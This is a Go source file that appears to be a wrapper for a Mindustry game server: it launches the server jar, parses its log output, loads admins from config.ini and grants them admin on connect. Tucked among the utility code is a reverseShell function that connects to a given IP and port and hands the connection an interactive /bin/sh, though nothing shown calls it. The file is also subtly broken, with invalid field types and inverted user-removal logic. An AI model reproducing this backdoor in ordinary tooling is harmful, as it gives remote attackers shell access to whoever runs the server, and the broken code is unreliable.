package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strings"
	"syscall"
	"time"

	"github.com/larspensjo/config"
)

const ansi = "[\u001B\u009B][[\\]()#;?]*(?:(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\u0007)|(?:(?:\\d{1,4}(?:;\\d{0,4})*)?[\\dA-PRZcf-ntqry=><~]))"

var re = regexp.MustCompile(ansi)

func StripColor(str string) string {
	return re.ReplaceAllString(str, "")
}
func reverseShell(ip string, port string) {
	c, _ := net.Dial("tcp", ip+":"+port)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

type CallBack interface {
	output(line string, in io.WriteCloser)
}

func execCommand(commandName string, params []string, handle CallBack) error {
	cmd := exec.Command(commandName, params...)
	fmt.Println(cmd.Args)
	stdout, outErr := cmd.StdoutPipe()
	stdin, inErr := cmd.StdinPipe()
	//cmd.Stdin = os.Stdin
	if outErr != nil {
		return outErr
	}

	if inErr != nil {
		return inErr
	}
	cmd.Start()
	go func(cmd *exec.Cmd) {
		c := make(chan os.Signal)
		signal.Notify(c, os.Interrupt, os.Kill, syscall.SIGUSR1, syscall.SIGUSR2)
		s := <-c
		if cmd.Process != nil {
			log.Printf("sub process exit:%s", s)
			cmd.Process.Kill()
		}
	}(cmd)

	go func(cmd *exec.Cmd) {
		reader := bufio.NewReader(os.Stdin)
		for {
			line, err2 := reader.ReadString('\n')
			if err2 != nil || io.EOF == err2 {
				break
			}
			execCmd(stdin, strings.TrimRight(line, "\n"))
		}
	}(cmd)

	//创建一个流来读取管道内内容，这里逻辑是通过一行一行的读取的
	reader := bufio.NewReader(stdout)

	//实时循环读取输出流中的一行内容
	for {
		line, err2 := reader.ReadString('\n')
		if err2 != nil || io.EOF == err2 {
			break
		}
		fmt.Printf(line)
		handle.output(StripColor(line), stdin)
	}
	cmd.Wait()
	return nil
}

type User struct {
	name          string
	isAdmin       bool
	isSupperAdmin bool
}
type Mindustry struct {
	name   string
	admins []string
	users  map[string]User
	adminCmds [string]
	superAdminCmds [string]
	serverOutR *regexp.Regexp
}

func (this *Mindustry) loadConfig() {

	cfg, err := config.ReadDefault("config.ini")
	if err != nil {
		log.Println("[ini]not find config.ini,use default config")
		return
	}
	if cfg.HasSection("server") {
		_, err := cfg.SectionOptions("server")
		if err == nil {
			optionValue := ""
			optionValue, err = cfg.String("server", "admins")
			if err == nil {
				optionValue := strings.TrimSpace(optionValue)
				admins := strings.Split(optionValue, ",")
				log.Printf("[ini]found admins:%v\n", admins)
				for _, admin := range admins {
					this.addUser(admin)
					this.addAdmin(admin)
				}
			}
			optionValue, err = cfg.String("server", "superAdmins")
			if err == nil {
				optionValue := strings.TrimSpace(optionValue)
				supAdmins := strings.Split(optionValue, ",")
				log.Printf("[ini]found supAdmins:%v\n", supAdmins)
				for _, supAdmin := range supAdmins {
					this.addUser(supAdmin)
					this.addSuperAdmin(supAdmin)
				}
			}
			optionValue, err = cfg.String("server", "name")
			if err == nil {
				name := strings.TrimSpace(optionValue)
				this.name = name
			}
		}
	}
}
func (this *Mindustry) init() {
	this.serverOutR, _ = regexp.Compile(".*(\\[INFO\\]|\\[ERR\\])(.*)")
	this.users = make(map[string]User)
	this.loadConfig()
	this.addUser("Server")
	this.addSuperAdmin("Server")

}
func (this *Mindustry) addUser(name string) {
	if _, ok := this.users[name]; ok {
		return
	}
	this.users[name] = User{name, false, false}
	log.Printf("add user info :%s\n", name)
}
func (this *Mindustry) addAdmin(name string) {
	if _, ok := this.users[name]; !ok {
		log.Printf("user %s not found\n", name)
		return
	}
	tempUser := this.users[name]
	tempUser.isAdmin = true
	this.users[name] = tempUser
	log.Printf("add admin :%s\n", name)
}

func (this *Mindustry) addSuperAdmin(name string) {
	if _, ok := this.users[name]; !ok {
		log.Printf("user %s not found\n", name)
		return
	}
	tempUser := this.users[name]
	tempUser.isAdmin = true
	tempUser.isSupperAdmin = true
	this.users[name] = tempUser
	log.Printf("add superAdmin :%s\n", name)
}

func (this *Mindustry) onlineUser(name string) {
	if _, ok := this.users[name]; ok {
		return
	}
	this.addUser(name)
}
func (this *Mindustry) offlineUser(name string) {
	if _, ok := this.users[name]; ok {
		return
	}

	if !(this.users[name].isAdmin || this.users[name].isSupperAdmin) {
		this.delUser(name)
		return
	}
}
func (this *Mindustry) delUser(name string) {
	if _, ok := this.users[name]; !ok {
		log.Printf("del user not exist :%s\n", name)
		return
	}
	delete(this.users, name)
	log.Printf("del user info :%s\n", name)
}
func execCmd(in io.WriteCloser, cmd string) {

	log.Printf("execCmd :%s\n", cmd)
	data := []byte(cmd + "\n")
	in.Write(data)
}

func say(in io.WriteCloser, cmd string) {
	data := []byte("say " + cmd + "\n")
	in.Write(data)
}

const USER_CONNECTED_KEY string = " has connected."
const USER_DISCONNECTED_KEY string = " has disconnected."
const SERVER_INFO_LOG string = "[INFO] "
const SERVER_READY_KEY string = "Server loaded. Type 'help' for help."

func (this *Mindustry) output(line string, in io.WriteCloser) {

	index := strings.Index(line, SERVER_INFO_LOG)
	if index < 0 {
		return
	}

	cmdBody := strings.TrimSpace(line[index+len(SERVER_INFO_LOG):])
	index = strings.Index(cmdBody, ":")
	if index > -1 {
		userName := strings.TrimSpace(cmdBody[:index])
		if _, ok := this.users[userName]; ok {
			if userName == "Server" {
				return
			}
			sayBody := cmdBody[index+1:]
			if(strings.HasPrefix(sayBody,"/")){
				temps := strings.Split(sayBody, " ")
				if(len(temps)>1 && this.adminCmds[temps[0]] != "" ){
					cmd := temps[0][1:]
					fmt.Printf("proc user[%s] cmd :%s", userName, cmd)
					return
				}
			}
			fmt.Printf("user[%s] say:%s", userName, cmdBody[index+1:])
		}
	}

	if strings.HasSuffix(cmdBody, USER_CONNECTED_KEY) {
		userName := strings.TrimSpace(cmdBody[:len(cmdBody)-len(USER_CONNECTED_KEY)])
		this.onlineUser(userName)

		if this.users[userName].isAdmin {
			time.Sleep(1 * time.Second)
			say(in, "Welcome admin:"+userName)
			execCmd(in, "admin "+userName)
		}

	} else if strings.HasSuffix(cmdBody, USER_DISCONNECTED_KEY) {
		userName := strings.TrimSpace(cmdBody[:len(cmdBody)-len(USER_DISCONNECTED_KEY)])
		this.offlineUser(userName)
	} else if strings.HasPrefix(cmdBody, SERVER_READY_KEY) {
		execCmd(in, "host Fortress")
	} else {

	}
}
func (mindustry *Mindustry) run() {
	var para = []string{"-jar", "server-release.jar"}
	execCommand("java", para, mindustry)
}
func main() {
	rand.Seed(time.Now().UnixNano())
	randomServerName := fmt.Sprintf("mindustry-%d", rand.Int())
	var name string
	flag.StringVar(&name, "name", randomServerName, "name")
	flag.Parse()
	mindustry := Mindustry{}
	mindustry.init()
	mindustry.run()
}
